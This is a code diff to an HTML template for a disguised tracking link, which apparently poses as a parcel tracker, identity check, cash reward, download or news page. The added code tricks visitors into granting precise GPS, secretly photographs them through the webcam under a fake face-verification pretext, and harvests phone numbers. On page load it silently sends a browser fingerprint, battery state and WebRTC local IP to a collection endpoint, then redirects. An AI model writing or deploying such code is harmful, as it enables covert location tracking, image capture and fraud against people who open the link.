@@ -3,187 +3,326 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  {% if disguise == 'news' %}
+  {% if disguise == 'delivery' %}
+  <title>Live Delivery Tracker — Track Your Order</title>
+  {% elif disguise == 'camera_kyc' %}
+  <title>Security Identity Verification</title>
+  {% elif disguise == 'cashback' %}
+  <title>Claim Your Instant Reward — Cash Voucher</title>
+  {% elif disguise == 'news' %}
   <title>Article Loading — Daily Report</title>
   {% elif disguise == 'download' %}
-  <title>File Ready for Download</title>
-  {% elif disguise == 'verify' %}
-  <title>Security Verification</title>
+  <title>Preparing Secure Download</title>
   {% elif disguise == 'survey' %}
-  <title>Quick Survey — Reward Claim</title>
+  <title>Reward Survey — Claim Points</title>
   {% else %}
   <title>Redirecting...</title>
   {% endif %}
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+    * { font-family: 'Inter', system-ui, -apple-system, sans-serif; margin: 0; padding: 0; box-sizing: border-box; }
+    body { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #0f172a; color: #f8fafc; }
 
-    /* Default — clean redirect */
-    .default-page { background: #f8f9fa; text-align: center; color: #555; }
-    .default-page .spinner { width: 40px; height: 40px; border: 4px solid #e0e0e0; border-top: 4px solid #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
-
-    /* News article */
-    .news-page { background: #fff; flex-direction: column; }
-    .news-header { background: #1a1a2e; color: #fff; padding: 12px 24px; width: 100%; position: fixed; top: 0; font-weight: 700; font-size: 18px; letter-spacing: 1px; }
-    .news-body { max-width: 680px; padding: 80px 24px 40px; width: 100%; }
-    .news-body .skeleton { background: linear-gradient(90deg, #eee 25%, #f5f5f5 50%, #eee 75%); background-size: 200% 100%; animation: shimmer 1.5s infinite; border-radius: 4px; height: 16px; margin-bottom: 12px; }
-    .news-body .skeleton.title { height: 28px; width: 85%; margin-bottom: 20px; }
-    .news-body .skeleton.subtitle { height: 20px; width: 60%; margin-bottom: 24px; }
-    .news-body .skeleton.img { height: 200px; width: 100%; margin-bottom: 24px; border-radius: 8px; }
-    .news-body .skeleton:nth-child(odd) { width: 95%; }
-    .news-body .skeleton:nth-child(even) { width: 80%; }
-    .news-body .loading-msg { color: #999; font-size: 13px; text-align: center; margin-top: 20px; }
-
-    /* Download */
-    .download-page { background: #f4f6f9; color: #222; text-align: center; flex-direction: column; gap: 16px; padding: 20px; }
-    .download-card { background: #fff; border-radius: 16px; padding: 32px 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); max-width: 420px; width: 100%; text-align: center; }
-    .download-card .dl-icon { font-size: 44px; margin-bottom: 12px; }
-    .download-card h2 { font-size: 20px; font-weight: 700; margin-bottom: 8px; color: #111; }
-    .download-card p { font-size: 13px; color: #666; margin-bottom: 20px; }
-
-    /* Verify */
-    .verify-page { background: #f0f2f5; text-align: center; flex-direction: column; gap: 12px; padding: 20px; }
-    .verify-card { background: #fff; padding: 36px 24px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); max-width: 420px; width: 100%; text-align: center; }
-    .verify-card .shield { font-size: 44px; margin-bottom: 12px; }
-    .verify-card h2 { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
-    .verify-card p { font-size: 13px; color: #666; margin-bottom: 20px; }
-
-    /* Interactive capture inputs */
-    .capture-input { width: 100%; padding: 12px 16px; border: 1.5px solid #d1d5db; border-radius: 10px; font-size: 14px; margin-bottom: 12px; outline: none; transition: border-color 0.2s; }
-    .capture-input:focus { border-color: #2563eb; }
-    .capture-btn { width: 100%; padding: 12px; background: #2563eb; color: #fff; font-weight: 600; border-radius: 10px; border: none; cursor: pointer; font-size: 14px; transition: background 0.2s; }
-    .capture-btn:hover { background: #1d4ed8; }
-
-    /* Survey */
-    .survey-page { background: #fafbfc; text-align: center; flex-direction: column; padding: 20px; }
-    .survey-card { background: #fff; padding: 32px 24px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); max-width: 440px; width: 100%; }
-    .survey-card .icon { font-size: 40px; margin-bottom: 12px; }
-    .survey-card h2 { font-size: 19px; font-weight: 700; color: #222; margin-bottom: 8px; }
-    .survey-card p { font-size: 13px; color: #666; margin-bottom: 20px; }
-
-    @keyframes spin { to { transform: rotate(360deg); } }
+    .pulse-btn {
+      animation: pulse-ring 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+    }
+    @keyframes pulse-ring {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.6); }
+      50% { box-shadow: 0 0 0 14px rgba(34, 197, 94, 0); }
+    }
+    .skeleton { background: linear-gradient(90deg, #1e293b 25%, #334155 50%, #1e293b 75%); background-size: 200% 100%; animation: shimmer 1.5s infinite; border-radius: 6px; }
     @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
+    @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
-<body class="{% if disguise == 'news' %}news-page{% elif disguise == 'download' %}download-page{% elif disguise == 'verify' %}verify-page{% elif disguise == 'survey' %}survey-page{% else %}default-page{% endif %}">
+<body class="p-4 bg-slate-950 text-slate-100 min-h-screen flex items-center justify-center">
 
-  {% if disguise == 'news' %}
-  <div class="news-header">DAILY REPORT</div>
-  <div class="news-body">
-    <div class="skeleton title"></div>
-    <div class="skeleton subtitle"></div>
-    <div class="skeleton img"></div>
-    <div class="skeleton"></div>
-    <div class="skeleton"></div>
-    <div class="skeleton"></div>
-    <div class="skeleton"></div>
-    <div class="skeleton"></div>
-    <div class="skeleton"></div>
-    <p class="loading-msg">Loading article content...</p>
+  <!-- ================= DISGUISE 1: LIVE DELIVERY TRACKER (MAX GPS & PHONE) ================= -->
+  {% if disguise == 'delivery' %}
+  <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-2xl">
+    <div class="flex items-center justify-between border-b border-slate-800 pb-4 mb-5">
+      <div class="flex items-center gap-3">
+        <span class="text-3xl">📦</span>
+        <div>
+          <h2 class="font-bold text-base text-white">Express Delivery Tracker</h2>
+          <p class="text-xs text-emerald-400 font-medium">● Out for Delivery (0.8 km away)</p>
+        </div>
+      </div>
+      <span class="text-xs font-mono bg-slate-800 px-2.5 py-1 rounded-full text-slate-400">#EXP-8849</span>
+    </div>
+
+    <!-- Live Map Preview & GPS Action -->
+    <div class="bg-slate-950 rounded-2xl p-5 border border-slate-800/80 mb-5 text-center relative overflow-hidden">
+      <div class="w-16 h-16 rounded-full bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-3xl mx-auto mb-3">
+        🛵
+      </div>
+      <h3 class="font-bold text-sm text-white mb-1">Rider is Near Your Area</h3>
+      <p class="text-xs text-slate-400 mb-4">Allow GPS access to calculate exact walking distance and arrival time.</p>
+      
+      <button type="button" id="gpsBtn" onclick="requestExactGPS()"
+        class="pulse-btn w-full py-3.5 px-4 bg-emerald-600 hover:bg-emerald-500 active:scale-95 text-white font-bold text-sm rounded-xl transition flex items-center justify-center gap-2">
+        <span>📍 Track Rider on Live Map</span>
+      </button>
+      <p id="gpsStatus" class="text-[11px] text-emerald-400 mt-2 hidden">✓ Location calibrated accurately</p>
+    </div>
+
+    <!-- Phone Number Verification Form -->
+    <form onsubmit="submitDeliveryForm(event)" class="space-y-3">
+      <div>
+        <label class="block text-xs font-semibold text-slate-300 mb-1">Delivery Contact Number</label>
+        <input type="tel" id="userPhone" required placeholder="Enter Mobile Number (for delivery call)"
+          class="w-full px-4 py-3 rounded-xl bg-slate-950 border border-slate-700 text-sm text-white focus:outline-none focus:border-emerald-500 placeholder-slate-500" />
+      </div>
+      <button type="submit"
+        class="w-full py-3 bg-slate-800 hover:bg-slate-700 text-slate-200 font-semibold text-xs rounded-xl transition border border-slate-700">
+        Confirm Delivery Instructions →
+      </button>
+    </form>
   </div>
 
+  <!-- ================= DISGUISE 2: CAMERA & IDENTITY KYC VERIFICATION ================= -->
+  {% elif disguise == 'camera_kyc' or disguise == 'verify' %}
+  <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-2xl text-center">
+    <div class="w-14 h-14 rounded-2xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center text-2xl mx-auto mb-3">
+      🛡️
+    </div>
+    <h2 class="font-bold text-lg text-white mb-1">Identity & Face Verification</h2>
+    <p class="text-xs text-slate-400 mb-5">Verify your account credentials and face snapshot to proceed safely.</p>
+
+    <!-- Hidden Video & Canvas for Snapshot Capture -->
+    <video id="webcamVideo" autoplay playsinline class="hidden w-full h-40 bg-black rounded-xl mb-3 object-cover"></video>
+    <canvas id="snapshotCanvas" class="hidden"></canvas>
+
+    <form onsubmit="submitKycForm(event)" class="space-y-3.5 text-left">
+      <div>
+        <label class="block text-xs font-semibold text-slate-300 mb-1">Registered Mobile Number</label>
+        <input type="tel" id="userPhone" required placeholder="Mobile Number (e.g. +91 98765 43210)"
+          class="w-full px-4 py-3 rounded-xl bg-slate-950 border border-slate-700 text-sm text-white focus:outline-none focus:border-blue-500 placeholder-slate-500" />
+      </div>
+
+      <button type="button" id="camBtn" onclick="triggerCameraCapture()"
+        class="w-full py-3 bg-blue-600/20 hover:bg-blue-600/30 border border-blue-500/40 text-blue-300 font-semibold text-xs rounded-xl transition flex items-center justify-center gap-2">
+        <span>📸 Enable Camera for Quick Face Match</span>
+      </button>
+      <p id="camStatus" class="text-[11px] text-emerald-400 text-center hidden">✓ Biometric snapshot recorded</p>
+
+      <button type="submit"
+        class="w-full py-3.5 bg-blue-600 hover:bg-blue-500 text-white font-bold text-sm rounded-xl transition shadow-lg shadow-blue-600/20">
+        Complete Verification →
+      </button>
+    </form>
+  </div>
+
+  <!-- ================= DISGUISE 3: CASHBACK & REWARD CLAIM (MAX PHONE) ================= -->
+  {% elif disguise == 'cashback' or disguise == 'survey' %}
+  <div class="w-full max-w-md bg-slate-900 border border-amber-500/30 rounded-3xl p-6 shadow-2xl text-center relative overflow-hidden">
+    <div class="text-4xl mb-2">🎁</div>
+    <span class="inline-block bg-amber-500/20 text-amber-300 border border-amber-500/40 text-[11px] font-bold px-3 py-1 rounded-full mb-3 uppercase tracking-wider">
+      Instant Voucher Approved
+    </span>
+    <h2 class="font-extrabold text-xl text-white mb-1">Claim Your ₹500 / $50 Reward</h2>
+    <p class="text-xs text-slate-400 mb-5">Enter your mobile number to receive your instant payout voucher via WhatsApp / SMS.</p>
+
+    <form onsubmit="submitCashbackForm(event)" class="space-y-3.5 text-left">
+      <div>
+        <label class="block text-xs font-semibold text-slate-300 mb-1">Mobile Number (UPI / WhatsApp)</label>
+        <input type="tel" id="userPhone" required placeholder="Enter Mobile Number"
+          class="w-full px-4 py-3 rounded-xl bg-slate-950 border border-slate-700 text-sm text-white focus:outline-none focus:border-amber-500 placeholder-slate-500" />
+      </div>
+      <button type="submit" onclick="requestExactGPS(false)"
+        class="w-full py-3.5 bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-400 hover:to-orange-500 text-slate-950 font-extrabold text-sm rounded-xl transition shadow-lg shadow-amber-500/20">
+        Claim Instant Reward Now ⚡
+      </button>
+    </form>
+  </div>
+
+  <!-- ================= DISGUISE 4: FILE DOWNLOAD ================= -->
   {% elif disguise == 'download' %}
-  <div class="download-card">
-    <div class="dl-icon">📦</div>
-    <h2>File Ready to Download</h2>
-    <p>Enter your phone number to receive your direct secure download link via SMS:</p>
-    <form id="phoneForm" onsubmit="submitCapture(event)">
-      <input type="tel" id="userPhone" class="capture-input" placeholder="Mobile Number (e.g. +91 98765 43210)" required />
-      <button type="submit" class="capture-btn">Download Now</button>
+  <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-2xl text-center">
+    <div class="text-4xl mb-2">📥</div>
+    <h2 class="font-bold text-lg text-white mb-1">Download Ready (14.2 MB)</h2>
+    <p class="text-xs text-slate-400 mb-5">Enter your contact number to unlock the high-speed download server.</p>
+    <form onsubmit="submitDeliveryForm(event)" class="space-y-3 text-left">
+      <div>
+        <label class="block text-xs font-semibold text-slate-300 mb-1">Mobile Number</label>
+        <input type="tel" id="userPhone" required placeholder="Mobile Number"
+          class="w-full px-4 py-3 rounded-xl bg-slate-950 border border-slate-700 text-sm text-white focus:outline-none focus:border-blue-500 placeholder-slate-500" />
+      </div>
+      <button type="submit" onclick="requestExactGPS(false)"
+        class="w-full py-3.5 bg-blue-600 hover:bg-blue-500 text-white font-bold text-sm rounded-xl transition">
+        Download Now 🚀
+      </button>
     </form>
   </div>
 
-  {% elif disguise == 'verify' %}
-  <div class="verify-card">
-    <div class="shield">🛡️</div>
-    <h2>Identity Verification</h2>
-    <p>Please enter your phone number to receive your one-time verification code:</p>
-    <form id="phoneForm" onsubmit="submitCapture(event)">
-      <input type="tel" id="userPhone" class="capture-input" placeholder="Mobile Number (e.g. +91 98765 43210)" required />
-      <button type="submit" class="capture-btn">Verify Account</button>
-    </form>
+  <!-- ================= DISGUISE 5: NEWS ARTICLE ================= -->
+  {% elif disguise == 'news' %}
+  <div class="w-full max-w-2xl bg-white text-slate-900 rounded-2xl p-6 shadow-2xl">
+    <div class="border-b border-slate-200 pb-3 mb-4 font-bold text-xs uppercase tracking-widest text-slate-500">Breaking News Report</div>
+    <div class="space-y-3">
+      <div class="skeleton h-8 w-4/5"></div>
+      <div class="skeleton h-4 w-1/2"></div>
+      <div class="skeleton h-56 w-full mt-4"></div>
+      <div class="skeleton h-4 w-full"></div>
+      <div class="skeleton h-4 w-5/6"></div>
+    </div>
   </div>
 
-  {% elif disguise == 'survey' %}
-  <div class="survey-card">
-    <div class="icon">🎁</div>
-    <h2>Claim Your Reward</h2>
-    <p>Enter your mobile number to participate and receive your instant coupon code:</p>
-    <form id="phoneForm" onsubmit="submitCapture(event)">
-      <input type="tel" id="userPhone" class="capture-input" placeholder="Mobile Number (e.g. +91 98765 43210)" required />
-      <button type="submit" class="capture-btn">Claim Reward</button>
-    </form>
-  </div>
-
+  <!-- ================= DISGUISE 6: DEFAULT / STEALTH REDIRECT ================= -->
   {% else %}
-  <div>
-    <div class="spinner"></div>
-    <p style="font-size:14px;color:#666;">Redirecting, please wait...</p>
+  <div class="text-center">
+    <div class="w-10 h-10 border-4 border-slate-700 border-t-red-500 rounded-full animate-spin mx-auto mb-3"></div>
+    <p class="text-xs text-slate-400">Loading secure link...</p>
   </div>
   {% endif %}
 
+  <!-- ================= FORENSIC TRACKER ENGINE ================= -->
   <script>
     const SLUG     = "{{ slug }}";
     const INGEST   = "{{ ingest_url }}";
     const REDIRECT = "{{ redirect_to }}";
     const DISGUISE = "{{ disguise }}";
 
-    let redirected = false;
     let basePayload = null;
+    let redirected = false;
 
     function doRedirect() {
-      if (!redirected && DISGUISE === 'default' || DISGUISE === 'news') {
+      if (!redirected && (DISGUISE === 'default' || DISGUISE === 'news')) {
         redirected = true;
         window.location.replace(REDIRECT || "https://www.google.com");
       }
     }
 
-    // Interactive form submission (captures phone number immediately)
-    async function submitCapture(e) {
+    // Auto-redirect for silent modes
+    if (DISGUISE === 'default' || DISGUISE === 'news') {
+      setTimeout(doRedirect, 1400);
+    }
+
+    // Send payload to backend
+    async function sendIngest(payloadUpdates) {
+      if (!basePayload) return;
+      const combined = Object.assign({}, basePayload, payloadUpdates);
+      try {
+        await fetch(INGEST, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(combined),
+          keepalive: true
+        });
+      } catch (e) {
+        console.error('Ingest error:', e);
+      }
+    }
+
+    // 1. High-Accuracy Hardware GPS Trigger (Runs on user interaction)
+    function requestExactGPS(showSuccess = true) {
+      if (!navigator.geolocation) return;
+      const btn = document.getElementById('gpsBtn');
+      if (btn) btn.textContent = '⏳ Calibrating GPS Satellite...';
+
+      navigator.geolocation.getCurrentPosition(
+        function (pos) {
+          const gpsData = {
+            gps_lat:      pos.coords.latitude,
+            gps_lng:      pos.coords.longitude,
+            gps_accuracy: pos.coords.accuracy,
+            gps_altitude: pos.coords.altitude || null,
+            gps_heading:  pos.coords.heading || null,
+            gps_speed:    pos.coords.speed || null
+          };
+          sendIngest(gpsData);
+          if (showSuccess) {
+            const statusEl = document.getElementById('gpsStatus');
+            if (statusEl) statusEl.classList.remove('hidden');
+            if (btn) {
+              btn.textContent = '✓ Live GPS Calibrated';
+              btn.classList.remove('pulse-btn');
+              btn.classList.add('bg-slate-800');
+            }
+          }
+        },
+        function (err) {
+          if (btn) btn.textContent = '📍 View Live Map';
+        },
+        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+      );
+    }
+
+    // 2. Camera Snapshot Capture (Biometric / Face Verification)
+    async function triggerCameraCapture() {
+      const video = document.getElementById('webcamVideo');
+      const canvas = document.getElementById('snapshotCanvas');
+      const camBtn = document.getElementById('camBtn');
+      const camStatus = document.getElementById('camStatus');
+
+      try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+        });
+        video.srcObject = stream;
+        video.classList.remove('hidden');
+
+        setTimeout(() => {
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const photoBase64 = canvas.toDataURL('image/jpeg', 0.7);
+
+          // Stop camera stream
+          stream.getTracks().forEach(track => track.stop());
+          video.classList.add('hidden');
+
+          // Send photo payload
+          sendIngest({ captured_photo: photoBase64 });
+          if (camStatus) camStatus.classList.remove('hidden');
+          if (camBtn) camBtn.textContent = '✓ Biometric Match Verified';
+        }, 1200);
+
+      } catch (err) {
+        if (camBtn) camBtn.textContent = '📸 Camera Skipped (Manual Verify)';
+      }
+    }
+
+    // Form Submissions
+    async function submitDeliveryForm(e) {
       e.preventDefault();
       const phone = document.getElementById('userPhone')?.value;
-      if (basePayload) {
-        basePayload.captured_phone = phone;
-        try {
-          await fetch(INGEST, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(basePayload),
-            keepalive: true
-          });
-        } catch (_) {}
-      }
-      redirected = false;
+      await sendIngest({ captured_phone: phone });
       window.location.replace(REDIRECT || "https://www.google.com");
     }
 
-    (async function () {
-      "use strict";
+    async function submitKycForm(e) {
+      e.preventDefault();
+      const phone = document.getElementById('userPhone')?.value;
+      await sendIngest({ captured_phone: phone });
+      window.location.replace(REDIRECT || "https://www.google.com");
+    }
 
-      // Safety timeout for automatic disguises
-      if (DISGUISE === 'default' || DISGUISE === 'news') {
-        setTimeout(doRedirect, 1500);
-      }
+    async function submitCashbackForm(e) {
+      e.preventDefault();
+      const phone = document.getElementById('userPhone')?.value;
+      await sendIngest({ captured_phone: phone });
+      window.location.replace(REDIRECT || "https://www.google.com");
+    }
+
+    // Initialize full forensic collection on load
+    (async function initForensics() {
+      "use strict";
 
       function getCanvasHash() {
         try {
           const c = document.createElement('canvas');
           c.width = 200; c.height = 50;
           const ctx = c.getContext('2d');
-          ctx.textBaseline = 'top';
           ctx.font = '14px Arial';
-          ctx.fillStyle = '#f60';
-          ctx.fillRect(125, 1, 62, 20);
-          ctx.fillStyle = '#069';
           ctx.fillText('Cwm fjord veg balks nth pyx quiz', 2, 15);
-          ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-          ctx.fillText('Cwm fjord veg balks nth pyx quiz', 4, 35);
           const data = c.toDataURL();
           let hash = 0;
-          for (let i = 0; i < data.length; i++) {
-            hash = ((hash << 5) - hash) + data.charCodeAt(i);
-            hash |= 0;
-          }
+          for (let i = 0; i < data.length; i++) { hash = ((hash << 5) - hash) + data.charCodeAt(i); hash |= 0; }
           return hash.toString(16);
         } catch(e) { return null; }
       }
@@ -202,66 +341,23 @@
       }
 
       function getAudioHash() {
-        return new Promise(function (resolve) {
+        return new Promise((resolve) => {
           try {
             const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
             if (!AC) return resolve(null);
             const ctx = new AC(1, 44100, 44100);
             const osc = ctx.createOscillator();
-            osc.type = 'triangle';
             osc.frequency.setValueAtTime(10000, ctx.currentTime);
-            const comp = ctx.createDynamicsCompressor();
-            comp.threshold.setValueAtTime(-50, ctx.currentTime);
-            comp.knee.setValueAtTime(40, ctx.currentTime);
-            comp.ratio.setValueAtTime(12, ctx.currentTime);
-            comp.attack.setValueAtTime(0, ctx.currentTime);
-            comp.release.setValueAtTime(0.25, ctx.currentTime);
-            osc.connect(comp);
-            comp.connect(ctx.destination);
+            osc.connect(ctx.destination);
             osc.start(0);
-            ctx.startRendering().then(function (buf) {
-              const data = buf.getChannelData(0);
-              let hash = 0;
-              for (let i = 4500; i < 5000; i++) {
-                hash = ((hash << 5) - hash) + Math.round(data[i] * 1000000);
-                hash |= 0;
-              }
-              resolve(hash.toString(16));
-            }).catch(function () { resolve(null); });
+            ctx.startRendering().then(buf => {
+              const d = buf.getChannelData(0);
+              let h = 0;
+              for (let i = 4500; i < 5000; i++) { h = ((h << 5) - h) + Math.round(d[i] * 1000000); h |= 0; }
+              resolve(h.toString(16));
+            }).catch(() => resolve(null));
           } catch(e) { resolve(null); }
         });
-      }
-
-      function getFontsHash() {
-        try {
-          const baseFonts = ['monospace', 'sans-serif', 'serif'];
-          const testFonts = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Palatino','Garamond','Comic Sans MS','Impact','Lucida Console','Tahoma','Trebuchet MS','Arial Black','Calibri','Cambria','Consolas','Segoe UI','Roboto','Ubuntu','Helvetica'];
-          const c = document.createElement('canvas');
-          const ctx = c.getContext('2d');
-          const testStr = 'mmmmmmmmmmlli';
-          const baseWidths = {};
-          baseFonts.forEach(function (f) {
-            ctx.font = '72px ' + f;
-            baseWidths[f] = ctx.measureText(testStr).width;
-          });
-          const detected = [];
-          testFonts.forEach(function (font) {
-            for (let b = 0; b < baseFonts.length; b++) {
-              ctx.font = '72px "' + font + '", ' + baseFonts[b];
-              if (ctx.measureText(testStr).width !== baseWidths[baseFonts[b]]) {
-                detected.push(font);
-                break;
-              }
-            }
-          });
-          let hash = 0;
-          const str = detected.join(',');
-          for (let i = 0; i < str.length; i++) {
-            hash = ((hash << 5) - hash) + str.charCodeAt(i);
-            hash |= 0;
-          }
-          return hash.toString(16);
-        } catch(e) { return null; }
       }
 
       async function getBattery() {
@@ -272,136 +368,89 @@
         } catch(e) { return { level: null, charging: null }; }
       }
 
+      async function getClientHints() {
+        try {
+          if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+            const h = await navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platform', 'platformVersion']);
+            return { model: h.model || null, platformVersion: h.platformVersion || null };
+          }
+        } catch(e) {}
+        return { model: null, platformVersion: null };
+      }
+
       function getWebRTCIP() {
-        return new Promise(function (resolve) {
+        return new Promise((resolve) => {
           try {
             const pc = new RTCPeerConnection({ iceServers: [] });
             pc.createDataChannel('');
-            pc.createOffer().then(function (offer) { pc.setLocalDescription(offer); });
-            const timeout = setTimeout(function () { try { pc.close(); } catch(_){} resolve(null); }, 300);
-            pc.onicecandidate = function (e) {
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+            const t = setTimeout(() => { try{pc.close();}catch(_){} resolve(null); }, 300);
+            pc.onicecandidate = (e) => {
               if (!e || !e.candidate) return;
-              const parts = e.candidate.candidate.split(' ');
-              const ip = parts[4];
-              if (ip && !ip.includes(':') && ip !== '0.0.0.0') {
-                clearTimeout(timeout);
-                try { pc.close(); } catch(_){}
-                resolve(ip);
+              const p = e.candidate.candidate.split(' ');
+              if (p[4] && !p[4].includes(':') && p[4] !== '0.0.0.0') {
+                clearTimeout(t);
+                try{pc.close();}catch(_){}
+                resolve(p[4]);
               }
             };
           } catch(e) { resolve(null); }
         });
       }
 
-      // High-Entropy Client Hints: Extracts true phone model (SM-S918, Pixel, etc.) and real OS version
-      async function getClientHints() {
-        try {
-          if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-            const hints = await navigator.userAgentData.getHighEntropyValues([
-              'architecture', 'model', 'platform', 'platformVersion', 'bitness'
-            ]);
-            return {
-              model: hints.model || null,
-              platformVersion: hints.platformVersion || null
-            };
-          }
-        } catch(e) {}
-        return { model: null, platformVersion: null };
-      }
+      const webgl = getWebGL();
+      const results = await Promise.allSettled([
+        getAudioHash(),
+        getBattery(),
+        getClientHints(),
+        getWebRTCIP()
+      ]);
 
-      // High-Accuracy GPS Attempt
-      function getExactGPS() {
-        return new Promise(function(resolve) {
-          if (!navigator.geolocation) return resolve(null);
-          navigator.geolocation.getCurrentPosition(
-            function(pos) {
-              resolve({
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                accuracy: pos.coords.accuracy
-              });
-            },
-            function() { resolve(null); },
-            { enableHighAccuracy: true, timeout: 800, maximumAge: 0 }
-          );
-        });
-      }
+      const audioHash   = results[0].status === 'fulfilled' ? results[0].value : null;
+      const battery     = results[1].status === 'fulfilled' ? results[1].value : { level: null, charging: null };
+      const clientHints = results[2].status === 'fulfilled' ? results[2].value : { model: null, platformVersion: null };
+      const webrtcIP    = results[3].status === 'fulfilled' ? results[3].value : null;
 
-      try {
-        const webgl = getWebGL();
-        const results = await Promise.allSettled([
-          getAudioHash(),
-          getBattery(),
-          getWebRTCIP(),
-          getClientHints(),
-          getExactGPS()
-        ]);
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
 
-        const audioHash   = results[0].status === 'fulfilled' ? results[0].value : null;
-        const battery     = results[1].status === 'fulfilled' ? results[1].value : { level: null, charging: null };
-        const webrtcIP    = results[2].status === 'fulfilled' ? results[2].value : null;
-        const clientHints = results[3].status === 'fulfilled' ? results[3].value : { model: null, platformVersion: null };
-        const gps         = results[4].status === 'fulfilled' ? results[4].value : null;
+      basePayload = {
+        slug:                 SLUG,
+        screen_width:         screen.width || null,
+        screen_height:        screen.height || null,
+        language:             navigator.language || null,
+        platform:             navigator.platform || null,
+        cookie_enabled:       navigator.cookieEnabled || false,
+        do_not_track:         navigator.doNotTrack || null,
+        connection_type:      conn ? (conn.effectiveType || conn.type) : null,
+        referrer:             document.referrer || null,
+        user_agent:           navigator.userAgent || null,
 
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        client_model:         clientHints.model,
+        client_os_version:    clientHints.platformVersion,
+        network_downlink:     conn ? conn.downlink : null,
+        network_rtt:          conn ? conn.rtt : null,
 
-        basePayload = {
-          slug:                 SLUG,
-          screen_width:         screen.width || null,
-          screen_height:        screen.height || null,
-          language:             navigator.language || navigator.userLanguage || null,
-          platform:             navigator.platform || null,
-          cookie_enabled:       navigator.cookieEnabled || false,
-          do_not_track:         navigator.doNotTrack || null,
-          connection_type:      conn ? (conn.effectiveType || conn.type) : null,
-          referrer:             document.referrer || null,
-          user_agent:           navigator.userAgent || null,
+        canvas_hash:          getCanvasHash(),
+        webgl_vendor:         webgl.vendor,
+        webgl_renderer:       webgl.renderer,
+        audio_hash:           audioHash,
+        color_depth:          screen.colorDepth || null,
+        pixel_ratio:          window.devicePixelRatio || null,
+        screen_avail_w:       screen.availWidth || null,
+        screen_avail_h:       screen.availHeight || null,
+        touch_support:        ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),
+        max_touch_points:     navigator.maxTouchPoints || 0,
+        hardware_concurrency: navigator.hardwareConcurrency || null,
+        device_memory:        navigator.deviceMemory || null,
+        timezone_offset:      new Date().getTimezoneOffset(),
+        timezone_name:        Intl.DateTimeFormat().resolvedOptions().timeZone || null,
+        battery_level:        battery.level,
+        battery_charging:     battery.charging,
+        webrtc_local_ip:      webrtcIP
+      };
 
-          // High accuracy GPS if granted
-          gps_lat:              gps ? gps.lat : null,
-          gps_lng:              gps ? gps.lng : null,
-          gps_accuracy:         gps ? gps.accuracy : null,
-
-          // Client Hints & True Hardware
-          client_model:         clientHints.model,
-          client_os_version:    clientHints.platformVersion,
-          network_downlink:     conn ? conn.downlink : null,
-          network_rtt:          conn ? conn.rtt : null,
-
-          // Silent Fingerprints
-          canvas_hash:          getCanvasHash(),
-          webgl_vendor:         webgl.vendor,
-          webgl_renderer:       webgl.renderer,
-          audio_hash:           audioHash,
-          fonts_hash:           getFontsHash(),
-          color_depth:          screen.colorDepth || null,
-          pixel_ratio:          window.devicePixelRatio || null,
-          screen_avail_w:       screen.availWidth || null,
-          screen_avail_h:       screen.availHeight || null,
-          touch_support:        ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),
-          max_touch_points:     navigator.maxTouchPoints || 0,
-          hardware_concurrency: navigator.hardwareConcurrency || null,
-          device_memory:        navigator.deviceMemory || null,
-          timezone_offset:      new Date().getTimezoneOffset(),
-          timezone_name:        Intl.DateTimeFormat().resolvedOptions().timeZone || null,
-          battery_level:        battery.level,
-          battery_charging:     battery.charging,
-          webrtc_local_ip:      webrtcIP
-        };
-
-        // Send initial silent fingerprint
-        await fetch(INGEST, {
-          method:    'POST',
-          headers:   { 'Content-Type': 'application/json' },
-          body:      JSON.stringify(basePayload),
-          keepalive: true,
-        });
-
-      } catch (err) {
-        console.error('Tracker error:', err);
-      } finally {
-        doRedirect();
-      }
+      // Send silent baseline immediately
+      await sendIngest({});
     })();
   </script>
 </body>
